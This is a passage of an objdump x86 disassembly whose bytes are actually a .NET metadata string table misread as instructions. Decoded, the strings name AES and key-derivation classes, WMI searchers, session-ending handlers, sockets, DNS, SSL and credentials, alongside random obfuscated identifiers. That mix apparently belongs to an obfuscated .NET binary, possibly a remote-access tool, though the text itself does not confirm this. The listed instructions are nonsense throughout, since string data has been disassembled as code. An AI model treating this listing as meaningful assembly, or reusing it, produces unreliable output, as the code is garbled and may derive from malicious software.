  4094c4:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094cb:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4094d2:	73 
  4094d3:	43                   	inc    %ebx
  4094d4:	72 79                	jb     0x40954f
  4094d6:	70 74                	jo     0x40954c
  4094d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4094d9:	53                   	push   %ebx
  4094da:	65 72 76             	gs jb  0x409553
  4094dd:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094e4:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4094eb:	72 
  4094ec:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4094f3:	64 65 72 00          	fs gs jb 0x4094f7
  4094f7:	4d                   	dec    %ebp
  4094f8:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4094ff:	74 2e                	je     0x40952f
  409501:	43                   	inc    %ebx
  409502:	53                   	push   %ebx
  409503:	68 61 72 70 2e       	push   $0x2e707261
  409508:	52                   	push   %edx
  409509:	75 6e                	jne    0x409579
  40950b:	74 69                	je     0x409576
  40950d:	6d                   	insl   (%dx),%es:(%edi)
  40950e:	65 42                	gs inc %edx
  409510:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  409517:	61                   	popa
  409518:	6c                   	insb   (%dx),%es:(%edi)
  409519:	6c                   	insb   (%dx),%es:(%edi)
  40951a:	53                   	push   %ebx
  40951b:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  409522:	65 
  409523:	72 00                	jb     0x409525
  409525:	67 65 74 5f          	addr16 gs je 0x409588
  409529:	42                   	inc    %edx
  40952a:	75 66                	jne    0x409592
  40952c:	66 65 72 00          	data16 gs jb 0x409530
  409530:	73 65                	jae    0x409597
  409532:	74 5f                	je     0x409593
  409534:	42                   	inc    %edx
  409535:	75 66                	jne    0x40959d
  409537:	66 65 72 00          	data16 gs jb 0x40953b
  40953b:	67 65 74 5f          	addr16 gs je 0x40959e
  40953f:	41                   	inc    %ecx
  409540:	73 49                	jae    0x40958b
  409542:	6e                   	outsb  %ds:(%esi),(%dx)
  409543:	74 65                	je     0x4095aa
  409545:	67 65 72 00          	addr16 gs jb 0x409549
  409549:	73 65                	jae    0x4095b0
  40954b:	74 5f                	je     0x4095ac
  40954d:	41                   	inc    %ecx
  40954e:	73 49                	jae    0x409599
  409550:	6e                   	outsb  %ds:(%esi),(%dx)
  409551:	74 65                	je     0x4095b8
  409553:	67 65 72 00          	addr16 gs jb 0x409557
  409557:	4d                   	dec    %ebp
  409558:	61                   	popa
  409559:	6e                   	outsb  %ds:(%esi),(%dx)
  40955a:	61                   	popa
  40955b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40955e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409560:	74 4f                	je     0x4095b1
  409562:	62 6a 65             	bound  %ebp,0x65(%edx)
  409565:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  409569:	61                   	popa
  40956a:	72 63                	jb     0x4095cf
  40956c:	68 65 72 00 53       	push   $0x53007265
  409571:	65 73 73             	gs jae 0x4095e7
  409574:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40957b:	6e                   	outsb  %ds:(%esi),(%dx)
  40957c:	67 45                	addr16 inc %ebp
  40957e:	76 65                	jbe    0x4095e5
  409580:	6e                   	outsb  %ds:(%esi),(%dx)
  409581:	74 48                	je     0x4095cb
  409583:	61                   	popa
  409584:	6e                   	outsb  %ds:(%esi),(%dx)
  409585:	64 6c                	fs insb (%dx),%es:(%edi)
  409587:	65 72 00             	gs jb  0x40958a
  40958a:	54                   	push   %esp
  40958b:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  409592:	55                   	push   %ebp
  409593:	70 70                	jo     0x409605
  409595:	65 72 00             	gs jb  0x409598
  409598:	43                   	inc    %ebx
  409599:	75 72                	jne    0x40960d
  40959b:	72 65                	jb     0x409602
  40959d:	6e                   	outsb  %ds:(%esi),(%dx)
  40959e:	74 55                	je     0x4095f5
  4095a0:	73 65                	jae    0x409607
  4095a2:	72 00                	jb     0x4095a4
  4095a4:	53                   	push   %ebx
  4095a5:	74 72                	je     0x409619
  4095a7:	65 61                	gs popa
  4095a9:	6d                   	insl   (%dx),%es:(%edi)
  4095aa:	57                   	push   %edi
  4095ab:	72 69                	jb     0x409616
  4095ad:	74 65                	je     0x409614
  4095af:	72 00                	jb     0x4095b1
  4095b1:	54                   	push   %esp
  4095b2:	65 78 74             	gs js  0x409629
  4095b5:	57                   	push   %edi
  4095b6:	72 69                	jb     0x409621
  4095b8:	74 65                	je     0x40961f
  4095ba:	72 00                	jb     0x4095bc
  4095bc:	45                   	inc    %ebp
  4095bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4095be:	74 65                	je     0x409625
  4095c0:	72 00                	jb     0x4095c2
  4095c2:	42                   	inc    %edx
  4095c3:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  4095ca:	72 
  4095cb:	74 65                	je     0x409632
  4095cd:	72 00                	jb     0x4095cf
  4095cf:	54                   	push   %esp
  4095d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4095d1:	4c                   	dec    %esp
  4095d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4095d3:	77 65                	ja     0x40963a
  4095d5:	72 00                	jb     0x4095d7
  4095d7:	49                   	dec    %ecx
  4095d8:	45                   	inc    %ebp
  4095d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4095da:	75 6d                	jne    0x409649
  4095dc:	65 72 61             	gs jb  0x409640
  4095df:	74 6f                	je     0x409650
  4095e1:	72 00                	jb     0x4095e3
  4095e3:	4d                   	dec    %ebp
  4095e4:	61                   	popa
  4095e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4095e6:	61                   	popa
  4095e7:	67 65 6d             	gs insl (%dx),%es:(%di)
  4095ea:	65 6e                	outsb  %gs:(%esi),(%dx)
  4095ec:	74 4f                	je     0x40963d
  4095ee:	62 6a 65             	bound  %ebp,0x65(%edx)
  4095f1:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4095f5:	75 6d                	jne    0x409664
  4095f7:	65 72 61             	gs jb  0x40965b
  4095fa:	74 6f                	je     0x40966b
  4095fc:	72 00                	jb     0x4095fe
  4095fe:	53                   	push   %ebx
  4095ff:	79 73                	jns    0x409674
  409601:	74 65                	je     0x409668
  409603:	6d                   	insl   (%dx),%es:(%edi)
  409604:	2e 43                	cs inc %ebx
  409606:	6f                   	outsl  %ds:(%esi),(%dx)
  409607:	6c                   	insb   (%dx),%es:(%edi)
  409608:	6c                   	insb   (%dx),%es:(%edi)
  409609:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40960e:	6e                   	outsb  %ds:(%esi),(%dx)
  40960f:	73 2e                	jae    0x40963f
  409611:	49                   	dec    %ecx
  409612:	45                   	inc    %ebp
  409613:	6e                   	outsb  %ds:(%esi),(%dx)
  409614:	75 6d                	jne    0x409683
  409616:	65 72 61             	gs jb  0x40967a
  409619:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  40961d:	47                   	inc    %edi
  40961e:	65 74 45             	gs je  0x409666
  409621:	6e                   	outsb  %ds:(%esi),(%dx)
  409622:	75 6d                	jne    0x409691
  409624:	65 72 61             	gs jb  0x409688
  409627:	74 6f                	je     0x409698
  409629:	72 00                	jb     0x40962b
  40962b:	41                   	inc    %ecx
  40962c:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  409630:	61                   	popa
  409631:	74 6f                	je     0x4096a2
  409633:	72 00                	jb     0x409635
  409635:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40963a:	00 2e                	add    %ch,(%esi)
  40963c:	63 63 74             	arpl   %esp,0x74(%ebx)
  40963f:	6f                   	outsl  %ds:(%esi),(%dx)
  409640:	72 00                	jb     0x409642
  409642:	4d                   	dec    %ebp
  409643:	6f                   	outsl  %ds:(%esi),(%dx)
  409644:	6e                   	outsb  %ds:(%esi),(%dx)
  409645:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  40964c:	65 
  40964d:	61                   	popa
  40964e:	74 65                	je     0x4096b5
  409650:	44                   	inc    %esp
  409651:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409655:	70 74                	jo     0x4096cb
  409657:	6f                   	outsl  %ds:(%esi),(%dx)
  409658:	72 00                	jb     0x40965a
  40965a:	43                   	inc    %ebx
  40965b:	72 65                	jb     0x4096c2
  40965d:	61                   	popa
  40965e:	74 65                	je     0x4096c5
  409660:	45                   	inc    %ebp
  409661:	6e                   	outsb  %ds:(%esi),(%dx)
  409662:	63 72 79             	arpl   %esi,0x79(%edx)
  409665:	70 74                	jo     0x4096db
  409667:	6f                   	outsl  %ds:(%esi),(%dx)
  409668:	72 00                	jb     0x40966a
  40966a:	49                   	dec    %ecx
  40966b:	6e                   	outsb  %ds:(%esi),(%dx)
  40966c:	74 50                	je     0x4096be
  40966e:	74 72                	je     0x4096e2
  409670:	00 6c 52 77          	add    %ch,0x77(%edx,%edx,2)
  409674:	4a                   	dec    %edx
  409675:	52                   	push   %edx
  409676:	4d                   	dec    %ebp
  409677:	58                   	pop    %eax
  409678:	61                   	popa
  409679:	48                   	dec    %eax
  40967a:	68 48 75 72 00       	push   $0x727548
  40967f:	6b 68 6e 43          	imul   $0x43,0x6e(%eax),%ebp
  409683:	68 75 49 6f 42       	push   $0x426f4975
  409688:	41                   	inc    %ecx
  409689:	57                   	push   %edi
  40968a:	7a 72                	jp     0x4096fe
  40968c:	00 53 79             	add    %dl,0x79(%ebx)
  40968f:	73 74                	jae    0x409705
  409691:	65 6d                	gs insl (%dx),%es:(%edi)
  409693:	2e 44                	cs inc %esp
  409695:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40969c:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  4096a3:	72 6f                	jb     0x409714
  4096a5:	73 6f                	jae    0x409716
  4096a7:	66 74 2e             	data16 je 0x4096d8
  4096aa:	56                   	push   %esi
  4096ab:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4096b2:	73 69                	jae    0x40971d
  4096b4:	63 2e                	arpl   %ebp,(%esi)
  4096b6:	44                   	inc    %esp
  4096b7:	65 76 69             	gs jbe 0x409723
  4096ba:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096bd:	00 53 79             	add    %dl,0x79(%ebx)
  4096c0:	73 74                	jae    0x409736
  4096c2:	65 6d                	gs insl (%dx),%es:(%edi)
  4096c4:	2e 52                	cs push %edx
  4096c6:	75 6e                	jne    0x409736
  4096c8:	74 69                	je     0x409733
  4096ca:	6d                   	insl   (%dx),%es:(%edi)
  4096cb:	65 2e 49             	gs cs dec %ecx
  4096ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4096cf:	74 65                	je     0x409736
  4096d1:	72 6f                	jb     0x409742
  4096d3:	70 53                	jo     0x409728
  4096d5:	65 72 76             	gs jb  0x40974e
  4096d8:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4096df:	73 74                	jae    0x409755
  4096e1:	65 6d                	gs insl (%dx),%es:(%edi)
  4096e3:	2e 52                	cs push %edx
  4096e5:	75 6e                	jne    0x409755
  4096e7:	74 69                	je     0x409752
  4096e9:	6d                   	insl   (%dx),%es:(%edi)
  4096ea:	65 2e 43             	gs cs inc %ebx
  4096ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4096ee:	6d                   	insl   (%dx),%es:(%edi)
  4096ef:	70 69                	jo     0x40975a
  4096f1:	6c                   	insb   (%dx),%es:(%edi)
  4096f2:	65 72 53             	gs jb  0x409748
  4096f5:	65 72 76             	gs jb  0x40976e
  4096f8:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4096ff:	62 75 67             	bound  %esi,0x67(%ebp)
  409702:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409709:	65 
  40970a:	73 00                	jae    0x40970c
  40970c:	45                   	inc    %ebp
  40970d:	78 70                	js     0x40977f
  40970f:	61                   	popa
  409710:	6e                   	outsb  %ds:(%esi),(%dx)
  409711:	64 45                	fs inc %ebp
  409713:	6e                   	outsb  %ds:(%esi),(%dx)
  409714:	76 69                	jbe    0x40977f
  409716:	72 6f                	jb     0x409787
  409718:	6e                   	outsb  %ds:(%esi),(%dx)
  409719:	6d                   	insl   (%dx),%es:(%edi)
  40971a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40971c:	74 56                	je     0x409774
  40971e:	61                   	popa
  40971f:	72 69                	jb     0x40978a
  409721:	61                   	popa
  409722:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  409726:	00 47 65             	add    %al,0x65(%edi)
  409729:	74 50                	je     0x40977b
  40972b:	72 6f                	jb     0x40979c
  40972d:	63 65 73             	arpl   %esp,0x73(%ebp)
  409730:	73 65                	jae    0x409797
  409732:	73 00                	jae    0x409734
  409734:	47                   	inc    %edi
  409735:	65 74 48             	gs je  0x409780
  409738:	6f                   	outsl  %ds:(%esi),(%dx)
  409739:	73 74                	jae    0x4097af
  40973b:	41                   	inc    %ecx
  40973c:	64 64 72 65          	fs fs jb 0x4097a5
  409740:	73 73                	jae    0x4097b5
  409742:	65 73 00             	gs jae 0x409745
  409745:	53                   	push   %ebx
  409746:	79 73                	jns    0x4097bb
  409748:	74 65                	je     0x4097af
  40974a:	6d                   	insl   (%dx),%es:(%edi)
  40974b:	2e 53                	cs push %ebx
  40974d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409751:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409758:	70 
  409759:	74 6f                	je     0x4097ca
  40975b:	67 72 61             	addr16 jb 0x4097bf
  40975e:	70 68                	jo     0x4097c8
  409760:	79 2e                	jns    0x409790
  409762:	58                   	pop    %eax
  409763:	35 30 39 43 65       	xor    $0x65433930,%eax
  409768:	72 74                	jb     0x4097de
  40976a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409771:	73 00                	jae    0x409773
  409773:	52                   	push   %edx
  409774:	66 63 32             	arpl   %si,(%edx)
  409777:	38 39                	cmp    %bh,(%ecx)
  409779:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  40977d:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  409784:	73 00                	jae    0x409786
  409786:	52                   	push   %edx
  409787:	65 61                	gs popa
  409789:	64 41                	fs inc %ecx
  40978b:	6c                   	insb   (%dx),%es:(%edi)
  40978c:	6c                   	insb   (%dx),%es:(%edi)
  40978d:	42                   	inc    %edx
  40978e:	79 74                	jns    0x409804
  409790:	65 73 00             	gs jae 0x409793
  409793:	47                   	inc    %edi
  409794:	65 74 42             	gs je  0x4097d9
  409797:	79 74                	jns    0x40980d
  409799:	65 73 00             	gs jae 0x40979c
  40979c:	43                   	inc    %ebx
  40979d:	53                   	push   %ebx
  40979e:	68 61 72 70 41       	push   $0x41707261
  4097a3:	72 67                	jb     0x40980c
  4097a5:	75 6d                	jne    0x409814
  4097a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097a9:	74 49                	je     0x4097f4
  4097ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4097ac:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097ae:	46                   	inc    %esi
  4097af:	6c                   	insb   (%dx),%es:(%edi)
  4097b0:	61                   	popa
  4097b1:	67 73 00             	addr16 jae 0x4097b4
  4097b4:	43                   	inc    %ebx
  4097b5:	53                   	push   %ebx
  4097b6:	68 61 72 70 42       	push   $0x42707261
  4097bb:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  4097c2:	61                   	popa
  4097c3:	67 73 00             	addr16 jae 0x4097c6
  4097c6:	53                   	push   %ebx
  4097c7:	74 72                	je     0x40983b
  4097c9:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4097d0:	73 73                	jae    0x409845
  4097d2:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4097d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4097da:	67 45                	addr16 inc %ebp
  4097dc:	76 65                	jbe    0x409843
  4097de:	6e                   	outsb  %ds:(%esi),(%dx)
  4097df:	74 41                	je     0x409822
  4097e1:	72 67                	jb     0x40984a
  4097e3:	73 00                	jae    0x4097e5
  4097e5:	47                   	inc    %edi
  4097e6:	66 67 56             	addr16 push %si
  4097e9:	43                   	inc    %ebx
  4097ea:	41                   	inc    %ecx
  4097eb:	74 59                	je     0x409846
  4097ed:	65 4d                	gs dec %ebp
  4097ef:	50                   	push   %eax
  4097f0:	45                   	inc    %ebp
  4097f1:	6a 73                	push   $0x73
  4097f3:	00 49 43             	add    %cl,0x43(%ecx)
  4097f6:	72 65                	jb     0x40985d
  4097f8:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4097fb:	74 69                	je     0x409866
  4097fd:	61                   	popa
  4097fe:	6c                   	insb   (%dx),%es:(%edi)
  4097ff:	73 00                	jae    0x409801
  409801:	73 65                	jae    0x409868
  409803:	74 5f                	je     0x409864
  409805:	43                   	inc    %ebx
  409806:	72 65                	jb     0x40986d
  409808:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40980b:	74 69                	je     0x409876
  40980d:	61                   	popa
  40980e:	6c                   	insb   (%dx),%es:(%edi)
  40980f:	73 00                	jae    0x409811
  409811:	45                   	inc    %ebp
  409812:	71 75                	jno    0x409889
  409814:	61                   	popa
  409815:	6c                   	insb   (%dx),%es:(%edi)
  409816:	73 00                	jae    0x409818
  409818:	53                   	push   %ebx
  409819:	73 6c                	jae    0x409887
  40981b:	50                   	push   %eax
  40981c:	72 6f                	jb     0x40988d
  40981e:	74 6f                	je     0x40988f
  409820:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409823:	73 00                	jae    0x409825
  409825:	53                   	push   %ebx
  409826:	79 73                	jns    0x40989b
  409828:	74 65                	je     0x40988f
  40982a:	6d                   	insl   (%dx),%es:(%edi)
  40982b:	2e 57                	cs push %edi
  40982d:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409834:	46                   	inc    %esi
  409835:	6f                   	outsl  %ds:(%esi),(%dx)
  409836:	72 6d                	jb     0x4098a5
  409838:	73 00                	jae    0x40983a
  40983a:	44                   	inc    %esp
  40983b:	6e                   	outsb  %ds:(%esi),(%dx)
  40983c:	73 00                	jae    0x40983e
  40983e:	43                   	inc    %ebx
  40983f:	6f                   	outsl  %ds:(%esi),(%dx)
  409840:	6e                   	outsb  %ds:(%esi),(%dx)
  409841:	74 61                	je     0x4098a4
  409843:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  40984a:	74 65                	je     0x4098b1
  40984c:	6d                   	insl   (%dx),%es:(%edi)
  40984d:	2e 43                	cs inc %ebx
  40984f:	6f                   	outsl  %ds:(%esi),(%dx)
  409850:	6c                   	insb   (%dx),%es:(%edi)
  409851:	6c                   	insb   (%dx),%es:(%edi)
  409852:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409857:	6e                   	outsb  %ds:(%esi),(%dx)
  409858:	73 00                	jae    0x40985a
  40985a:	53                   	push   %ebx
  40985b:	74 72                	je     0x4098cf
  40985d:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409864:	74 4f                	je     0x4098b5
  409866:	70 74                	jo     0x4098dc
  409868:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  40986f:	74 49                	je     0x4098ba
  409871:	6d                   	insl   (%dx),%es:(%edi)
  409872:	61                   	popa
  409873:	67 65 44             	addr16 gs inc %esp
  409876:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  40987a:	65 72 73             	gs jb  0x4098f0
  40987d:	00 52 75             	add    %dl,0x75(%edx)
  409880:	6e                   	outsb  %ds:(%esi),(%dx)
  409881:	74 69                	je     0x4098ec
  409883:	6d                   	insl   (%dx),%es:(%edi)
  409884:	65 48                	gs dec %eax
  409886:	65 6c                	gs insb (%dx),%es:(%edi)
  409888:	70 65                	jo     0x4098ef
  40988a:	72 73                	jb     0x4098ff
  40988c:	00 53 73             	add    %dl,0x73(%ebx)
  40988f:	6c                   	insb   (%dx),%es:(%edi)
  409890:	50                   	push   %eax
  409891:	6f                   	outsl  %ds:(%esi),(%dx)
  409892:	6c                   	insb   (%dx),%es:(%edi)
  409893:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40989a:	72 73                	jb     0x40990f
  40989c:	00 46 69             	add    %al,0x69(%esi)
  40989f:	6c                   	insb   (%dx),%es:(%edi)
  4098a0:	65 41                	gs inc %ecx
  4098a2:	63 63 65             	arpl   %esp,0x65(%ebx)
  4098a5:	73 73                	jae    0x40991a
  4098a7:	00 47 65             	add    %al,0x65(%edi)
  4098aa:	74 43                	je     0x4098ef
  4098ac:	75 72                	jne    0x409920
  4098ae:	72 65                	jb     0x409915
  4098b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4098b1:	74 50                	je     0x409903
  4098b3:	72 6f                	jb     0x409924
  4098b5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4098b8:	73 00                	jae    0x4098ba
  4098ba:	49                   	dec    %ecx
  4098bb:	50                   	push   %eax
  4098bc:	41                   	inc    %ecx
  4098bd:	64 64 72 65          	fs fs jb 0x409926
  4098c1:	73 73                	jae    0x409936
  4098c3:	00 53 79             	add    %dl,0x79(%ebx)
  4098c6:	73 74                	jae    0x40993c
  4098c8:	65 6d                	gs insl (%dx),%es:(%edi)
  4098ca:	2e 4e                	cs dec %esi
  4098cc:	65 74 2e             	gs je  0x4098fd
  4098cf:	53                   	push   %ebx
  4098d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4098d1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4098d4:	74 73                	je     0x409949
  4098d6:	00 79 62             	add    %bh,0x62(%ecx)
  4098d9:	43                   	inc    %ebx
  4098da:	52                   	push   %edx
  4098db:	4f                   	dec    %edi
  4098dc:	59                   	pop    %ecx
  4098dd:	74 45                	je     0x409924
  4098df:	78 7a                	js     0x40995b
  4098e1:	66 74 73             	data16 je 0x409957
  4098e4:	00 73 65             	add    %dh,0x65(%ebx)
  4098e7:	74 5f                	je     0x409948
  4098e9:	41                   	inc    %ecx
  4098ea:	72 67                	jb     0x409953
  4098ec:	75 6d                	jne    0x40995b
  4098ee:	65 6e                	outsb  %gs:(%esi),(%dx)
  4098f0:	74 73                	je     0x409965
  4098f2:	00 53 79             	add    %dl,0x79(%ebx)
  4098f5:	73 74                	jae    0x40996b
  4098f7:	65 6d                	gs insl (%dx),%es:(%edi)
  4098f9:	45                   	inc    %ebp
  4098fa:	76 65                	jbe    0x409961
  4098fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4098fd:	74 73                	je     0x409972
  4098ff:	00 45 78             	add    %al,0x78(%ebp)
  409902:	69 73 74 73 00 6a 48 	imul   $0x486a0073,0x74(%ebx),%esi
  409909:	6c                   	insb   (%dx),%es:(%edi)
  40990a:	66 69 6a 6e 6b 6f    	imul   $0x6f6b,0x6e(%edx),%bp
  409910:	4a                   	dec    %edx
  409911:	68 51 74 00 43       	push   $0x43007451
  409916:	79 6e                	jns    0x409986
  409918:	76 52                	jbe    0x40996c
  40991a:	67 73 48             	addr16 jae 0x409965
  40991d:	4b                   	dec    %ebx
  40991e:	51                   	push   %ecx
  40991f:	56                   	push   %esi
  409920:	74 00                	je     0x409922
  409922:	72 4d                	jb     0x409971
  409924:	75 64                	jne    0x40998a
  409926:	6b 5a 78 49          	imul   $0x49,0x78(%edx),%ebx
  40992a:	59                   	pop    %ecx
  40992b:	74 00                	je     0x40992d
  40992d:	43                   	inc    %ebx
  40992e:	6f                   	outsl  %ds:(%esi),(%dx)
  40992f:	6e                   	outsb  %ds:(%esi),(%dx)
  409930:	63 61 74             	arpl   %esp,0x74(%ecx)
  409933:	00 49 6d             	add    %cl,0x6d(%ecx)
  409936:	61                   	popa
  409937:	67 65 46             	addr16 gs inc %esi
  40993a:	6f                   	outsl  %ds:(%esi),(%dx)
  40993b:	72 6d                	jb     0x4099aa
  40993d:	61                   	popa
  40993e:	74 00                	je     0x409940
  409940:	67 65 74 5f          	addr16 gs je 0x4099a3
  409944:	41                   	inc    %ecx
  409945:	73 46                	jae    0x40998d
  409947:	6c                   	insb   (%dx),%es:(%edi)
  409948:	6f                   	outsl  %ds:(%esi),(%dx)
  409949:	61                   	popa
  40994a:	74 00                	je     0x40994c
  40994c:	73 65                	jae    0x4099b3
  40994e:	74 5f                	je     0x4099af
  409950:	41                   	inc    %ecx
  409951:	73 46                	jae    0x409999
  409953:	6c                   	insb   (%dx),%es:(%edi)
  409954:	6f                   	outsl  %ds:(%esi),(%dx)
  409955:	61                   	popa
  409956:	74 00                	je     0x409958
  409958:	4d                   	dec    %ebp
  409959:	61                   	popa
  40995a:	6e                   	outsb  %ds:(%esi),(%dx)
  40995b:	61                   	popa
  40995c:	67 65 6d             	gs insl (%dx),%es:(%di)
  40995f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409961:	74 42                	je     0x4099a5
  409963:	61                   	popa
  409964:	73 65                	jae    0x4099cb
  409966:	4f                   	dec    %edi
  409967:	62 6a 65             	bound  %ebp,0x65(%edx)
  40996a:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40996e:	6f                   	outsl  %ds:(%esi),(%dx)
  40996f:	6c                   	insb   (%dx),%es:(%edi)
  409970:	6c                   	insb   (%dx),%es:(%edi)
  409971:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409976:	6f                   	outsl  %ds:(%esi),(%dx)
  409977:	6e                   	outsb  %ds:(%esi),(%dx)
  409978:	6e                   	outsb  %ds:(%esi),(%dx)
  409979:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40997e:	65 74 00             	gs je  0x409981
  409981:	53                   	push   %ebx
  409982:	79 73                	jns    0x4099f7
  409984:	74 65                	je     0x4099eb
  409986:	6d                   	insl   (%dx),%es:(%edi)
  409987:	2e 4e                	cs dec %esi
  409989:	65 74 00             	gs je  0x40998c
  40998c:	54                   	push   %esp
  40998d:	61                   	popa
  40998e:	72 67                	jb     0x4099f7
  409990:	65 74 00             	gs je  0x409993
  409993:	53                   	push   %ebx
  409994:	6f                   	outsl  %ds:(%esi),(%dx)
  409995:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409998:	74 00                	je     0x40999a
  40999a:	53                   	push   %ebx
  40999b:	79 73                	jns    0x409a10
  40999d:	74 65                	je     0x409a04
  40999f:	6d                   	insl   (%dx),%es:(%edi)
  4099a0:	2e 43                	cs inc %ebx
  4099a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a3:	6c                   	insb   (%dx),%es:(%edi)
  4099a4:	6c                   	insb   (%dx),%es:(%edi)
  4099a5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4099aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4099ab:	73 2e                	jae    0x4099db
  4099ad:	49                   	dec    %ecx
  4099ae:	45                   	inc    %ebp
  4099af:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b0:	75 6d                	jne    0x409a1f
  4099b2:	65 72 61             	gs jb  0x409a16
  4099b5:	74 6f                	je     0x409a26
  4099b7:	72 2e                	jb     0x4099e7
  4099b9:	52                   	push   %edx
  4099ba:	65 73 65             	gs jae 0x409a22
  4099bd:	74 00                	je     0x4099bf
  4099bf:	67 65 74 5f          	addr16 gs je 0x409a22
  4099c3:	4f                   	dec    %edi
  4099c4:	66 66 73 65          	data16 data16 jae 0x409a2d
  4099c8:	74 00                	je     0x4099ca
  4099ca:	73 65                	jae    0x409a31
  4099cc:	74 5f                	je     0x409a2d
  4099ce:	4f                   	dec    %edi
  4099cf:	66 66 73 65          	data16 data16 jae 0x409a38
  4099d3:	74 00                	je     0x4099d5
  4099d5:	53                   	push   %ebx
  4099d6:	70 6c                	jo     0x409a44
  4099d8:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  4099df:	00 
  4099e0:	49                   	dec    %ecx
  4099e1:	41                   	inc    %ecx
  4099e2:	73 79                	jae    0x409a5d
  4099e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4099e5:	63 52 65             	arpl   %edx,0x65(%edx)
  4099e8:	73 75                	jae    0x409a5f
  4099ea:	6c                   	insb   (%dx),%es:(%edi)
  4099eb:	74 00                	je     0x4099ed
  4099ed:	54                   	push   %esp
  4099ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4099ef:	55                   	push   %ebp
  4099f0:	70 70                	jo     0x409a62
  4099f2:	65 72 49             	gs jb  0x409a3e
  4099f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4099f6:	76 61                	jbe    0x409a59
  4099f8:	72 69                	jb     0x409a63
  4099fa:	61                   	popa
  4099fb:	6e                   	outsb  %ds:(%esi),(%dx)
